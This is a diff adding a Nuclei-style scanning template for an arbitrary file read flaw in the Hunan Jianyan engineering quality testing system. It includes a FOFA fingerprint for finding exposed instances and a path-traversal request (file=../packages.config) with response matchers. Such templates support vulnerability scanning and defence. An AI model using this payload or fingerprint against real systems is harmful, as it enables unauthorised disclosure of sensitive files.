@@ -1,0 +1,24 @@
+id: hunan-jianyan-test-download-file-read
+
+info:
+  name: "湖南建研工程质量检测系统 Download 接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/Content/Theme/Standard/"
+        湖南建研工程质量检测系统 Download 接口存在任意文件读取缺陷，攻击者可利用该漏洞读取任意文件，可能导致敏感信息泄露及系统安全风险
+  tags: 湖南建研工程质量检测系统
+
+http:
+- raw:
+  - |
+    GET /Applications/Bid/Download.cshtml?file=../packages.config HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Microsoft.AspNet.WebPages.zh-Hans'
